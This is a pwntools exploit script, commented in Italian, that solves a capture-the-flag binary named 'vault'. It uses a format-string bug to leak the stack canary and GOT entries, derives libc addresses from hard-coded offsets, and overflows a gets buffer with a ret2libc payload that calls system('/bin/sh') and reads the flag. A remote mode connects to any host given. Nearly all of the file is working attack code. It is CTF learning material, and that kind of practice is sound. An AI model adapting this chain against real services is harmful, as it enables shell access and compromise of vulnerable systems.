#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./vault")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db entry0+722; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)




io = start()

def store_vault(what):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'vault? ', what)

def access_vault():
    io.sendlineafter(b'> ', b'2')
    io.recvuntil(b'ur stuff: ')
    return io.recvline()

def search_offset(payload):
        log.info("payload = %s" % repr(payload))
        store_vault(payload)
        data = access_vault()
        return data

def leak_address(offset):
    fmt = f'%{offset}$p'.encode()
    store_vault(fmt)
    leak = access_vault()
    leak = int(leak, 16)
    return leak

'''
Spiegazione tattica:
la challenge permette di fare read e write su una memoria, banalmente solo questo.
Ma usa due funzioni gravemente vulnerabili:
gets, che prende input senza controllare la lunghezza -> buffer overflow
printf non parametrizzata, che crea una fmtstr vuln -> lettura e scrittura ovunque.

Il programma ha gli indirizzi randomizzati e le funzioni senza nome, quindi ho lavorato
con offset statici, dei magic number. Non sono a caso, sono trovati da analisi statica con 
r2, quindi nessuna magia, solo sottrazioni.

Il programma non contiene nulla che mi permetta di interagire con il sistema.
Quindi me lo sono creato:

1. leak del canary per il ret2lib
2. leak della GOT per trovare gli indirizzi della libc
3. trovare dove si trova la funzione system nella libc conoscendo le posizioni correnti
4. fare il return 2 libc.
'''

offset = 7              # il mio input si trova all'indice 7
canary_fmt_offset = 23  # idem con patate
return_fmt_offset = 27
stack_leak_offset = 28

# il return value address era solo a scopo di debug
canary = leak_address(canary_fmt_offset)
return_value = leak_address(return_fmt_offset)
return_address = leak_address(stack_leak_offset) - 36

# ora che so dove la funzione ritorna a fine esecuzione
# calcolo quanto dista dalla GOT e trovo l'indirizzo
printf_got = return_value + 11354
gets_got = return_value + 11358

success(f'canary value -> {hex(canary)}')
success(f'return address -> {hex(return_value)}')
success(f'return value @ {hex(return_address)}')
success(f'printf got @ {hex(printf_got)}')
success(f'gets got @ {hex(gets_got)}')

# ora leggo nell'indirizzo trovato per avere il libc address
fmtstr = p32(printf_got)+f'%{offset}$s'.encode()
store_vault(fmtstr)
printf_libc = u32(access_vault()[4:8])
success(f'printf libc @ {hex(printf_libc)}')

fmtstr = p32(gets_got)+f'%{offset}$s'.encode()
store_vault(fmtstr)
gets_libc = u32(access_vault()[4:8])
success(f'gets libc @ {hex(gets_libc)}')

'''
Per trovare i valori di dove si trova system, basterebbe usare la stessa librearia, 
calcolare la base della libc con leak - libc.printf e da qui trovare il resto.

In questo caso la libc non e' fornita e, a causa di un errore di sistema, non posso
scaricarla. Quindi, con https://libc.blukat.me/ cerco gli indirizzi e mi faccio dare
gli offset.
'''
libc_base = printf_libc - 0x059b80
libc_system = libc_base + 0x051f50
libc_binsh_str = libc_base + 0x1cce52

success(f'system libc @ {hex(libc_system)}')
success(f'binsh  libc @ {hex(libc_binsh_str)}')

# ora che ho tutti i pezzi, creo il payload 
# per chiamare system(/bin/sh)

summon_system = b''.join([
    b'a'*64,                # BOF
    p32(canary),            
    b'\x00'*12,             # padding
    p32(libc_system),       
    p32(0),                 # sintassi di chiamata in x86
    p32(libc_binsh_str),
    ])
store_vault(summon_system)

# ora faccio chiudere il programma e siamo pronti
io.sendline(b'3')
io.sendline(b'cat /home/chall/flag.txt')
data = io.recvregex(rb'scriptCTF\{.*\}', capture=True)
flag = data.group(0).decode()
success(f'Flag: {flag}')
io.close() 